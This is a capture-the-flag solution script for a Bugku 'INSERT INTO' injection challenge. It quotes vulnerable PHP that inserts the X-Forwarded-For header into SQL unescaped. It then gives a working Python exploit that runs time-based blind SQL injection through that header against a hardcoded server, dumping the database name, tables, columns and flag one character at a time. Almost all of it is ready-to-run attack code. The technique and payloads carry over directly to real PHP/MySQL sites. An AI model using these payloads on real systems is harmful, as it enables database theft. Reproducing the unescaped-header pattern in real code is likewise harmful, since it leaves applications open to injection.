"""
https://ctf.bugku.com/challenges#INSERT%20INTO%E6%B3%A8%E5%85%A5

error_reporting(0);

function getIp(){
$ip = '';
if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
}else{
$ip = $_SERVER['REMOTE_ADDR'];
}
$ip_arr = explode(',', $ip);
return $ip_arr[0];

}

$host="localhost";
$user="";
$pass="";
$db="";

$connect = mysql_connect($host, $user, $pass) or die("Unable to connect");

mysql_select_db($db) or die("Unable to select database");

$ip = getIp();
echo 'your ip is :'.$ip;
$sql="insert into client_ip (ip) values ('$ip')";
mysql_query($sql);
"""
import requests


def exp(payload, all_chars=None, char_len=40, timeout=3):
    if all_chars is None:
        all_chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-!#$%&"
    all_chars += " "    # 末尾留个空格方便判断

    url = "http://123.206.87.240:8002/web15/"
    session = requests.Session()
    result = ""
    for idx in range(1, char_len):
        print("正在猜第{}个字符".format(idx))
        for c in all_chars:
            if c == all_chars[-1]:
                print("到尾了 result={}".format(result))
                return result

            headers = {
                'X-Forwarded-For': payload.format(idx=idx, c=c, sleep_time=timeout)
            }
            try:
                session.get(url, headers=headers, timeout=timeout)
            except Exception:
                result += c
                print(idx, "result:", result)
                break


# 爆库名 web15
# database=web15
database_payload = "127.0.0.1'+(select case when substr((select database()) from {idx} for 1)='{c}' then sleep({sleep_time}) else 0 end))#"

database_name = exp(database_payload)
print("database_name={}".format(database_name))


# 爆表名 database=web15
# tables=client_ip;flag
tabes_payload = "127.0.0.1'+(select case when substr((select group_concat(table_name separator '-') from information_schema.tables where table_schema=database()) from {idx} for 1)='{c}' then sleep({sleep_time}) else 0 end))#"

tables_name = exp(tabes_payload)
print("tables_name={}".format(tables_name))


# 爆字段名 table: flag
# 过滤了 , 这里用 - 作为分隔符
# columns=flag
columns_payload = "127.0.0.1'+(select case when substr((select group_concat(column_name separator '-') from information_schema.columns where table_name='flag') from {idx} for 1)='{c}' then sleep({sleep_time}) else 0 end))#"
columns_name = exp(columns_payload)
print("columns_name={}".format(columns_name))

# 取flag
flag_payload = "127.0.0.1'+(select case when substr((select group_concat(flag separator '-') from flag) from {idx} for 1)='{c}' then sleep({sleep_time}) else 0 end))#"

flag = exp(flag_payload)
print("flag={}".format(flag))
